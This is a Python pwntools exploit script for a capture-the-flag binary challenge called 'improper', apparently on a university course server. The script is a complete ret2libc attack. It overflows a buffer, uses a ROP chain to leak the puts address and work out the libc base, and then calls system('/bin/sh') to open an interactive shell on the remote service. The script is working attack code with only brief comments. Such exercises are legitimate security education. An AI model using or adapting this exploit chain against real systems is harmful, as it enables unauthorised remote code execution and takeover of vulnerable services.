from pwn import * # import pwntools library

context.arch = "amd64"
offset = 152

elf = ELF("./improper")
#p = process("./improper")
p = remote('cs2107-ctfd-i.comp.nus.edu.sg', 4009)

rop = ROP(elf)
rop.call(elf.symbols["puts"], [elf.got["puts"]])
rop.call(elf.symbols["main"]) #allow us to send payload twice

for i in range(7):
    print(p.recvuntil(b"\n"))

payload = [
        b"A"*offset,
        rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)


puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"puts found at {hex(puts)}") #get hex value of puts and search libc version on https://libc.blukat.me/ 

libc = ELF("libc6_2.31-0ubuntu9_amd64.so") #downloaded from site
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address determined {hex(libc.address)}")

rop = ROP(libc)
rop.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
rop.call("system", [ next(libc.search(b"/bin/sh\x00")) ])
rop.call("exit")

payload = [
        b"A"*offset,
        rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

p.interactive()
